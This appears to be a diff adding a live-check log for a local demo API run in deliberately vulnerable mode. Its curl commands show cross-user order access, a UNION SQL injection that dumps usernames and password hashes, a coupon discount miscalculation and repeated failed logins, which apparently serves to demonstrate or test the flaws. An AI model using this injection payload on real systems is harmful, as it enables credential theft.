@@ -1,0 +1,11 @@
+# live check: DEMO_FIXED=0 uvicorn demo_api.app:app --host 127.0.0.1 --port 8000
+$ curl -s http://127.0.0.1:8000/health
+{"status":"ok","mode":"vulnerable"}
+$ curl -s -H 'Authorization: Bearer bob-token' http://127.0.0.1:8000/orders/1
+{"id":1,"user_id":1,"items":[{"product_id":3,"name":"Wireless mouse","quantity":2,"unit_price":"19.99"}],"coupon":null,"subtotal":"39.98","discount":"0.00","total":"39.98","status":"paid"}
+$ curl -s -G http://127.0.0.1:8000/products --data-urlencode "search=zzz' UNION SELECT id, username || ':' || password_hash, 0, 0 FROM users--"
+[{"id":1,"name":"alice:6198f50cba51030c361ff55c6c2c32928f09ff71144cda86a1e22ff5d664b7fd","price":"0.00","stock":0},{"id":2,"name":"bob:7df25982c15c54e4067025d5e0de9f3ff26d289b980752883646666a706e133a","price":"0.00","stock":0},{"id":3,"name":"admin:5eedc43e05a907377fb402da8d59d48af0115cb9528cdc1e0987765837e758a9","price":"0.00","stock":0}]
+$ curl -s -X POST -H 'Authorization: Bearer alice-token' -H 'Content-Type: application/json' -d '{"items":[{"product_id":1,"quantity":3}],"coupon":"SAVE10"}' http://127.0.0.1:8000/orders
+{"id":3,"user_id":1,"items":[{"product_id":1,"name":"USB-C cable","quantity":3,"unit_price":"9.99"}],"coupon":"SAVE10","subtotal":"29.97","discount":"5.69","total":"24.28","status":"pending"}
+$ (10 bad logins)
+401 401 401 401 401 401 401 401 401 401 
